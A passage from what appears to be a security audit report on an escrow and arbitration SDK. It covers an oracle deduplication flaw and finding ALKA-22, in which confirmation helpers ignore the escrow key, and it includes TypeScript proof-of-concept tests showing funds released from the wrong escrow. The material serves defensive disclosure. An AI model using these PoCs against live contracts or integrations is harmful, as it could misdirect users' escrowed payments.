  return { ctx, oracle, escrow, fulfillment, realInner, realDemand, bogusDemand };
}

test("allUnarbitrated listener still handles a later second demand on the same fulfillment", async () => {
  const { ctx, oracle, escrow, fulfillment, realDemand, bogusDemand } = await makeScenario();
  const seen: `0x${string}`[] = [];

  try {
    const listener = await ctx.charlie.client.arbiters.general.trustedOracle.arbitrateMany(
      async () => true,
      {
        mode: "allUnarbitrated",
        pollingInterval: 50,
        onAfterArbitrate: async (decision) => {
          seen.push(decision.hash);
        },
      },
    );

    const bogusRequest = await ctx.bob.client.arbiters.general.trustedOracle.requestArbitration(
      fulfillment.uid,
      oracle,
      bogusDemand,
    );
    await ctx.testClient.waitForTransactionReceipt({ hash: bogusRequest });

    for (let attempts = 0; attempts < 50 && seen.length < 1; attempts++) {
      await Bun.sleep(50);
    }
    expect(seen.length).toBeGreaterThanOrEqual(1);

    const realRequest = await ctx.bob.client.arbiters.general.trustedOracle.requestArbitration(
      fulfillment.uid,
      oracle,
      realDemand,
    );
    await ctx.testClient.waitForTransactionReceipt({ hash: realRequest });

    let collectionHash: `0x${string}` | undefined;
    for (let attempts = 0; attempts < 50; attempts++) {
      try {
        collectionHash = await ctx.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid);
        break;
      } catch {
        await Bun.sleep(50);
      }
    }

    listener.unwatch();

    expect(seen.length).toBeGreaterThanOrEqual(2);
    expect(collectionHash).toBeTruthy();
  } finally {
    await teardownTestEnvironment(ctx);
  }
}, 20_000);

test("allUnarbitrated backlog replay skips a different pending demand after an earlier decision", async () => {
  const { ctx, oracle, escrow, fulfillment, realInner, realDemand, bogusDemand } = await makeScenario();

  try {
    const bogusRequest = await ctx.bob.client.arbiters.general.trustedOracle.requestArbitration(
      fulfillment.uid,
      oracle,
      bogusDemand,
    );
    await ctx.testClient.waitForTransactionReceipt({ hash: bogusRequest });

    const firstPass = await ctx.charlie.client.arbiters.general.trustedOracle.arbitrateMany(
      async () => true,
      { mode: "past" },
    );
    expect(firstPass.decisions.length).toBe(1);
    await Promise.all(firstPass.decisions.map((decision) => ctx.testClient.waitForTransactionReceipt({ hash: decision.hash })));

    const realRequest = await ctx.bob.client.arbiters.general.trustedOracle.requestArbitration(
      fulfillment.uid,
      oracle,
      realDemand,
    );
    await ctx.testClient.waitForTransactionReceipt({ hash: realRequest });

    const replay = await ctx.charlie.client.arbiters.general.trustedOracle.arbitrateMany(
      async () => true,
      { mode: "allUnarbitrated", pollingInterval: 50 },
    );
    replay.unwatch();

    expect(replay.decisions.length).toBe(0);

    let collectFailed = false;
    try {
      await ctx.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid);
    } catch {
      collectFailed = true;
    }
    expect(collectFailed).toBe(true);

    const manual = await ctx.charlie.client.arbiters.general.trustedOracle.arbitrate(
      fulfillment.uid,
      realInner,
      true,
    );
    await ctx.testClient.waitForTransactionReceipt({ hash: manual });

    const collectionHash = await ctx.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid);
    expect(collectionHash).toBeTruthy();
  } finally {
    await teardownTestEnvironment(ctx);
  }
}, 20_000);
```

##### bun test

Path: `sdks/ts`

```bash
cd sdks/ts
bun test tests/unit/POC_oracle_3f76b899.test.ts --timeout 60000
```

#### Recommendation

Deduplicate by the same namespace the contract enforces:
- derive `decisionKey = keccak256(abi.encodePacked(fulfillmentUid, innerDemand))` and filter `ArbitrationMade` by `decisionKey`, or
- include the raw demand bytes in the status helper APIs and only treat an event as final when both `fulfillmentUid` and the demand-specific key match.

#### Assumptions

- [x] The oracle service uses the TypeScript helper for backlog replay after downtime or restart.
- [x] The same fulfillment can legitimately carry multiple different oracle demands.
- [x] A prior `ArbitrationMade` can exist for the same `(fulfillmentUid, oracle)` before the later demand is replayed.

#### Predicted Invalid Reasons

- This is only an off-chain helper issue; new events are still processed, and operators can use `mode: all` or manually verify demand bytes. `requestArbitration` events are just hints.

<a id="finding-alka-22"></a>
### ALKA-22 — Confirmation request helpers collapse the `(fulfillment, escrow)` authority key and can route confirmations to the wrong escrow

#### Summary

On-chain confirmation authority is keyed by `(fulfillment, escrow)`, but the shipped TS and Rust wait helpers only filter `(fulfillment, confirmer)` and the Python wrapper drops `escrow` from the returned event. In multi-escrow flows this can surface a stale request and drive a legitimate confirmer to authorize the wrong escrow, which can settle the wrong payout or consume an exclusive confirmation slot.

#### Context Files

##### ExclusiveRevocableConfirmationArbiter.sol

Path: `contracts/src/arbiters/confirmation/ExclusiveRevocableConfirmationArbiter.sol`
Highlight lines: 19, 60, 108

```solidity
event ConfirmationRequested(bytes32 indexed fulfillment, address indexed confirmer, bytes32 indexed escrow);
mapping(bytes32 => mapping(bytes32 => bool)) public confirmations;
return confirmations[fulfillment.uid][escrowUid];
```

##### exclusiveRevocableConfirmationArbiter.ts

Path: `sdks/ts/src/clients/arbiters/confirmation/exclusiveRevocableConfirmationArbiter.ts`
Highlight lines: 137, 140

```typescript
const logs = await viemClient.getLogs({
  address: addresses.exclusiveRevocableConfirmationArbiter,
  event: confirmationRequestedEvent,
  args: { fulfillment, confirmer },
  fromBlock: "earliest",
  toBlock: "latest",
});
```

##### exclusive_revocable.rs

Path: `sdks/rs/src/clients/arbiters/confirmation/exclusive_revocable.rs`
Highlight lines: 134

```text
The Rust helper uses the same two-topic filter in `sdks/rs/src/clients/arbiters/confirmation/exclusive_revocable.rs:134`, and `wait_for_first_log()` returns the first historical log before any live subscription in `sdks/rs/src/utils.rs:193`.
```

##### exclusive_revocable.rs

Path: `sdks/py/src/clients/arbiters/confirmation/exclusive_revocable.rs`
Highlight lines: 154, 207

```text
The Python wrapper forwards the same weak lookup and then discards `escrow` entirely when building `PyConfirmationRequestedLog` in `sdks/py/src/clients/arbiters/confirmation/exclusive_revocable.rs:154` and `sdks/py/src/clients/arbiters/confirmation/exclusive_revocable.rs:207`.
```

#### Proof of Concept

From `sdks/ts`, save the PoC as `tests/unit/POC_confirmation_request_helper_62ddce4e.test.ts` and run `bun test tests/unit/POC_confirmation_request_helper_62ddce4e.test.ts`. The helper resolves to the earlier `escrowA` request even after `escrowB` is emitted later, so confirming the returned request authorizes `escrowA` and leaves `escrowB` unconfirmed.

##### POC_confirmation_request_helper_62ddce4e.test.ts

Path: `sdks/ts/tests/unit/POC_confirmation_request_helper_62ddce4e.test.ts`

```typescript
import { expect, test } from "bun:test";
   
   import { abi as erc20Abi } from "../../src/contracts/ERC20Permit";
   import { writeContract } from "../../src/utils";
   import { setupTestEnvironment } from "../utils/setup";
   import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";
   
   /**
    * @title POC: Confirmation request helper can route a confirmer to the wrong escrow
    * @notice Proof Statement: Prove that the shipped TypeScript `waitForConfirmationRequest(fulfillment, confirmer)`
    * helper collapses the real `(fulfillment, escrow)` request namespace to `(fulfillment, confirmer)`. When two
    * confirmation requests exist for the same fulfillment and confirmer, the helper returns the earliest request.
    * A confirmer bot that trusts the returned event and immediately calls `confirm` can therefore release an
    * unintended unconditional escrow and leave the later request unresolved.
    */
   test(
     "waitForConfirmationRequest returns the stale escrow and releases the wrong unconditional payment",
     async () => {
       const testContext = await setupTestEnvironment();
   
       try {
         const token = testContext.mockAddresses.erc20A;
         const arbiter = testContext.addresses.exclusiveRevocableConfirmationArbiter;
         const demand = "0x" as const;
   
         const approveHash = await writeContract(testContext.alice.client.viemClient, {
           address: token,
           abi: erc20Abi.abi,
           functionName: "approve",
           args: [testContext.addresses.erc20UnconditionalEscrowObligation, 101n],
         });
         await testContext.testClient.waitForTransactionReceipt({ hash: approveHash });
   
         const { attested: escrowA } = await testContext.alice.client.erc20.escrow.unconditional.create(
           { address: token, value: 100n },
           { arbiter, demand },
           0n,
         );
         const { attested: escrowB } = await testContext.alice.client.erc20.escrow.unconditional.create(
           { address: token, value: 1n },
           { arbiter, demand },
           0n,
         );
   
         const { attested: fulfillment } = await testContext.bob.client.stringObligation.doObligation("shared-fulfillment");
   
         const requestAHash = await testContext.bob.client.arbiters.confirmation.exclusiveRevocable.requestConfirmation(
           fulfillment.uid,
           escrowA.uid,
         );
         await testContext.testClient.waitForTransactionReceipt({ hash: requestAHash });
   
         const requestBHash = await testContext.bob.client.arbiters.confirmation.exclusiveRevocable.requestConfirmation(
           fulfillment.uid,
           escrowB.uid,
         );
         await testContext.testClient.waitForTransactionReceipt({ hash: requestBHash });
   
         const routedRequest =
           await testContext.alice.client.arbiters.confirmation.exclusiveRevocable.waitForConfirmationRequest(
             fulfillment.uid,
             testContext.alice.address,
           );
   
         if (!routedRequest.fulfillment || !routedRequest.escrow) {
           throw new Error("Confirmation request helper returned an incomplete event");
         }
   
         console.log("helper escrow:", routedRequest.escrow);
         console.log("earliest escrow:", escrowA.uid);
         console.log("later escrow:", escrowB.uid);
   
         expect(routedRequest.escrow).toBe(escrowA.uid);
         expect(routedRequest.escrow).not.toBe(escrowB.uid);
   
         const bobBalanceBefore = await testContext.bob.client.viemClient.readContract({
           address: token,
           abi: erc20Abi.abi,
           functionName: "balanceOf",
           args: [testContext.bob.address],
         });
   
         const confirmHash = await testContext.alice.client.arbiters.confirmation.exclusiveRevocable.confirm(
           routedRequest.fulfillment,
           routedRequest.escrow,
         );
         await testContext.testClient.waitForTransactionReceipt({ hash: confirmHash });
   
         const collectHash = await testContext.bob.client.erc20.escrow.unconditional.collect(escrowA.uid, fulfillment.uid);
         await testContext.testClient.waitForTransactionReceipt({ hash: collectHash });
   
         const bobBalanceAfter = await testContext.bob.client.viemClient.readContract({
           address: token,
           abi: erc20Abi.abi,
           functionName: "balanceOf",
           args: [testContext.bob.address],
         });
   
         console.log("bob balance delta:", bobBalanceAfter - bobBalanceBefore);
   
         const confirmedA = await testContext.alice.client.arbiters.confirmation.exclusiveRevocable.isConfirmed(
           fulfillment.uid,
           escrowA.uid,
         );
         const confirmedB = await testContext.alice.client.arbiters.confirmation.exclusiveRevocable.isConfirmed(
           fulfillment.uid,
           escrowB.uid,
         );
   
         expect(confirmedA).toBe(true);
         expect(confirmedB).toBe(false);
         expect(bobBalanceAfter - bobBalanceBefore).toBe(100n);
         await expect(
           testContext.bob.client.erc20.escrow.unconditional.collect(escrowB.uid, fulfillment.uid),
         ).rejects.toThrow();
       } finally {
         await teardownTestEnvironment(testContext);
       }
     },
     { timeout: 120_000 },
   );
```

#### Recommendation

Make the helper APIs escrow-aware everywhere:
- require `escrow` as an input filter for confirmation-request wait helpers,
- include `escrow` in every returned confirmation-request object, especially the Python wrapper, and
- reject or clearly surface ambiguous historical matches instead of returning the first `(fulfillment, confirmer)` log.

Fix checklist:

- [ ] Add `escrow` to the confirmation-request wait helper filter in every SDK.
- [ ] Preserve `escrow` in every returned confirmation-request object.
- [ ] Reject ambiguous historical matches instead of returning the first matching log.
- [ ] Add regression coverage for same-fulfillment multi-escrow confirmation requests.

#### Assumptions

- [x] The shipped wait helpers are used by integrations to decide which escrow to confirm.
- [x] A single fulfillment can legitimately appear in requests for multiple escrows.
- [x] The integration acts on the helper output without an extra escrow-specific verification step.

#### Predicted Invalid Reasons

- "This is only an off-chain event helper issue. Callers receive the event args and can inspect the escrow themselves, so there is no protocol vulnerability."
